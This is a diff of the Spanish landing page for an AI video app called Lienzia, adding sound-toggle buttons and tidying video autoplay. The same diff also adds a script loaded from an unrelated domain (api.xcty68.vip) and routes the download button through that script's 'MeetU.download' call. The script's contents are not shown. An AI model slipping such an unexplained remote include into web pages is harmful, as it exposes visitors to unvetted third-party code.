@@ -6,6 +6,7 @@
 <meta name="theme-color" content="#0E0A22">
 <meta name="description" content="Lienzia — Aplicación móvil para crear vídeos ilustrados con inteligencia artificial. Convierte un tema en un vídeo con narración, subtítulos y música.">
 <title>Lienzia · Vídeos ilustrados con IA</title>
+   <script src="https://api.xcty68.vip/js/meetu-sdk.js"></script>
 <style>
   :root{
     --ink:#0E0A22;
@@ -375,6 +376,35 @@
     .paso-grid{grid-template-columns:1fr 1fr;gap:56px}
     .paso-grid.flip .paso-media{order:-1}
   }
+
+  /* Estilos para el botón de sonido dentro del thumb */
+  .sound-toggle {
+    position: absolute;
+    bottom: 14px;
+    right: 14px;
+    z-index: 10;
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(4px);
+    border: 1px solid rgba(255,255,255,0.2);
+    border-radius: 50%;
+    width: 36px;
+    height: 36px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 18px;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  .sound-toggle:hover {
+    background: rgba(0,0,0,0.8);
+  }
+  .sound-toggle svg {
+    width: 18px;
+    height: 18px;
+    fill: currentColor;
+  }
 </style>
 </head>
 <body>
@@ -501,16 +531,16 @@
       <p class="sec-sub">Estos dos vídeos completos en español muestran el resultado final en formato vertical y horizontal.</p>
     </div>
 
-
 <div class="vid-grid">
+  <!-- Vídeo vertical -->
   <article class="vid-card v">
-    <!-- Se añade height:230px para que el video se muestre correctamente -->
-    <div class="vid-thumb" style="position:relative; overflow:hidden; background:#000; height:230px;">
-      <video src="img/1.mp4" autoplay loop playsinline preload="auto" style="width:100%; height:100%; object-fit:cover; display:block; position:absolute; top:0; left:0;"></video>
-      <span class="vid-badge" style="position:absolute; bottom:8px; left:8px; background:rgba(0,0,0,0.7); color:#fff; padding:2px 8px; border-radius:12px; font-size:12px; z-index:2;">Vertical · 9:16</span>
-      <span class="play" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:#fff; font-size:40px; z-index:2; opacity:0.6;">
-        <svg viewBox="0 0 24 24" fill="currentColor" style="width:48px; height:48px;"><path d="M8 5.14v13.72c0 .8.87 1.3 1.56.88l10.9-6.86a1.05 1.05 0 0 0 0-1.76L9.56 4.26A1.04 1.04 0 0 0 8 5.14Z"/></svg>
-      </span>
+    <div class="vid-thumb" style="position:relative; overflow:hidden; background:#000; width:100%; aspect-ratio: 9 / 16;">
+      <video id="video1" src="img/1.mp4" autoplay loop playsinline preload="auto" muted style="width:100%; height:100%; object-fit:cover; display:block; position:absolute; top:0; left:0;"></video>
+     
+      <!-- Botón de sonido -->
+      <button class="sound-toggle" data-video="video1" aria-label="Alternar sonido">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5L6 9H2v6h4l5 4V5z"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
+      </button>
     </div>
     <div class="vid-body">
       <h3>¿Qué es un agente de IA?</h3>
@@ -523,13 +553,14 @@
     </div>
   </article>
 
+  <!-- Vídeo horizontal -->
   <article class="vid-card h">
-    <div class="vid-thumb" style="position:relative; overflow:hidden; background:#000; height:230px;">
-      <video src="img/2h.mp4" autoplay loop playsinline preload="auto" style="width:100%; height:100%; object-fit:cover; display:block; position:absolute; top:0; left:0;"></video>
-      <span class="vid-badge" style="position:absolute; bottom:8px; left:8px; background:rgba(0,0,0,0.7); color:#fff; padding:2px 8px; border-radius:12px; font-size:12px; z-index:2;">Horizontal · 16:9</span>
-      <span class="play" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:#fff; font-size:40px; z-index:2; opacity:0.6;">
-        <svg viewBox="0 0 24 24" fill="currentColor" style="width:48px; height:48px;"><path d="M8 5.14v13.72c0 .8.87 1.3 1.56.88l10.9-6.86a1.05 1.05 0 0 0 0-1.76L9.56 4.26A1.04 1.04 0 0 0 8 5.14Z"/></svg>
-      </span>
+    <div class="vid-thumb" style="position:relative; overflow:hidden; background:#000; width:100%; aspect-ratio: 16 / 9;">
+      <video id="video2" src="img/2h.mp4" autoplay loop playsinline preload="auto" muted style="width:100%; height:100%; object-fit:cover; display:block; position:absolute; top:0; left:0;"></video>
+   
+      <button class="sound-toggle" data-video="video2" aria-label="Alternar sonido">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5L6 9H2v6h4l5 4V5z"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
+      </button>
     </div>
     <div class="vid-body">
       <h3>¿Por qué la IA inventa respuestas?</h3>
@@ -714,26 +745,31 @@
 <script>
   // Acción de los botones de llamada a la acción
   function k2() {
-    window.location.href = 'https://www.qq.com/';
+   MeetU.download(event);
   }
 
-  // Mejora para la reproducción de vídeos con sonido:
-  // 1. Intenta reproducir automáticamente (si el navegador lo permite)
-  // 2. Si falla, espera la primera interacción del usuario para iniciar la reproducción con sonido
+  // Control de sonido para los vídeos
+  document.querySelectorAll('.sound-toggle').forEach(btn => {
+    btn.addEventListener('click', function(e) {
+      e.stopPropagation();
+      const videoId = this.dataset.video;
+      const video = document.getElementById(videoId);
+      if (video) {
+        video.muted = !video.muted;
+        // Cambiar icono (opcional)
+        this.innerHTML = video.muted ?
+          '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5L6 9H2v6h4l5 4V5z"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>' :
+          '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5L6 9H2v6h4l5 4V5z"/><path d="M22 9l-6 6"/><path d="M16 9l6 6"/></svg>';
+      }
+    });
+  });
+
+  // Asegurar que los vídeos se reproduzcan (autoplay ya está, pero si falla por mute, igual se reproduce)
   document.addEventListener('DOMContentLoaded', function() {
     const videos = document.querySelectorAll('.vid-thumb video');
-    // Intenta reproducir todos los vídeos
     videos.forEach(v => {
-      v.play().catch(() => {
-        // Si falla (por política de autoplay), añadimos un listener de click global
-        const playOnClick = function() {
-          videos.forEach(v => {
-            v.play().catch(e => console.log('Error al reproducir:', e));
-          });
-          document.removeEventListener('click', playOnClick);
-        };
-        document.addEventListener('click', playOnClick, { once: true });
-      });
+      // Intentar reproducir, si falla no importa porque ya tiene muted y autoplay
+      v.play().catch(() => {});
     });
   });
 </script>
